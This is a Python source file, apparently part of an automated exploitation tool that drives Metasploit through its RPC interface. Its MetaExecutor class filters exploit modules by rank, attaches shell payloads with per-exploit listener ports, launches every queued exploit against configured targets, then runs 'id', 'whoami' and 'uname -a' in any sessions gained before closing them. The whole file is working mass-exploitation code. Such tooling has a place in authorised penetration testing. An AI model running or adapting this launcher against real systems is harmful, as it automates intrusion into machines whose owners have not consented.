from concurrent.futures import ThreadPoolExecutor
import time
try:
    from Queue import Queue, Empty
except ImportError:
    from queue import Queue, Empty

class MetaExecutor:
    monster = None
    logger = None
    queue = None
    is_working = True
    port_min = 0
    port_max = 65535
    port_current = 0
    monitor = {

    }
    working = []

    def __init__(self, monster, todo):
        self.monster = monster
        self.logger = self.monster.client.logger
        self.queue = Queue()
        self.port_min = int(self.monster.msf['settings']['shell_port_start'])
        self.port_current = int(self.monster.msf['settings']['shell_port_start'])
        self.port_max = int(self.monster.msf['settings']['shell_port_end'])
        available = self.port_max - self.port_min
        if len(todo) > available:
            self.logger.warning("The number of found exploits %d exceeds the max number of ports: %d")
            self.logger.info("Only using first %d exploits due to listen port limitations" % available)
            todo = todo[0:available-1]

        for entry in todo:
            self.queue.put(entry)

    def threadedExecutor(self, exploit):
        info = self.monster.client.request("module.info", ['exploits', exploit])
        rank = info['rank']

        if str(rank) not in self.monster.msf['settings']['min_success']:
            self.logger.debug("Exploit %s does not meet minimum required exploit rank" % exploit)
            return exploit, None

        if self.monster.msf['settings']['ignore_SRVHOST'] and 'SRVHOST' in info['options']:
            self.logger.debug("Exploit %s requires SRVHOST.. ignoring" % exploit)
            return exploit, None

        if self.monster.msf['settings']['ignore_privileged'] and info['privileged']:
            self.logger.debug("Exploit %s requires credentials (privileged).. ignoring" % exploit)
            return exploit, None

        payloads = self.monster.client.request("module.compatible_payloads", [exploit])['payloads']
        selected_payload = None
        for payload in payloads:
            if self.monster.msf['settings']['shell_type'] in payload:
                selected_payload = payload
                break
        for payload in payloads:
            if not selected_payload:
                if self.monster.msf['settings']['shell_type_fallback'] in payload:
                    selected_payload = payload
                    break
        if not selected_payload:
            self.logger.debug("Exploit %s cannot find good payload" % exploit)
            return exploit, None

        listen_port = self.port_current
        self.port_current += 1
        options = self.parse_options(info['options'])
        options['PAYLOAD'] = selected_payload.strip()
        options['LPORT'] = listen_port
        options['TARGET'] = 0
        options['VERBOSE'] = True
        run_options = ','.join([str(key) + "=" + str(options[key]) for key in options])
        self.logger.debug("Running exploit %s, payload=%s, settings=%s" % (exploit, selected_payload, run_options))
        exec_result = self.monster.client.request("module.execute", ["exploit", "exploit/"+exploit, options])
        if exec_result['job_id']:
            self.monitor[exec_result['job_id']] = exploit
            self.logger.debug("Started exploit %s" % exploit)
            time.sleep(5)
        else:
            self.logger.debug("Error starting exploit exploit %s" % exploit)

    def parse_options(self, options):
        params = self.monster.msf['parameters']
        opt_set = {}
        for option in options:
            if option in params:
                opt_set[option.strip()] = params[option]
            if options[option]['required'] and not option in params:
                if 'default' in options[option]:
                    opt_set[option] = options[option]['default']
                else:
                    self.logger.warning("%s is not set, setting to empty value" % option)
                    opt_set[option] = ""
        return opt_set

    def parse_and_close(self, session_id, session_data):
        exploit = session_data['via_exploit']
        self.logger.info("%s appears to have worked and has created a session" % exploit)
        if not self.monster.msf['settings']['gather_basic_info']:
            self.working.append([exploit, {}])
            self.monster.client.request("session.stop", [session_id])
            return
        else:
            if session_data['type'] == "shell":
                outputs = {}
                res = self.monster.client.request("session.shell_write", [session_id, 'id\n'])
                outputs['id'] = self.monster.client.request("session.shell_read", [session_id])
                self.monster.client.request("session.shell_write", [session_id, 'whoami\n'])
                outputs['whoami'] = self.monster.client.request("session.shell_read", [session_id])
                self.monster.client.request("session.shell_write", [session_id, 'uname -a\n'])
                outputs['uname'] = self.monster.client.request("session.shell_read", [session_id])
                self.working.append([exploit, outputs])
        self.monster.client.request("session.stop", [session_id])

    def check_monitor(self):
        results = self.monster.client.request("session.list", [])
        if(len(results)):
            for session in results:
                self.parse_and_close(session, results[session])

    def kill_all(self):
        for job_id in self.monster.client.request("job.list"):
            self.monster.client.request("job.stop", [job_id])

    def start(self):

        while(self.is_working):
            if self.queue.empty():
                self.logger.info("All modules started, waiting 10 seconds")
                time.sleep(10)
                self.check_monitor()
                self.kill_all()
                return self.working

            u = self.queue.get()
            self.threadedExecutor(u)
            self.check_monitor()
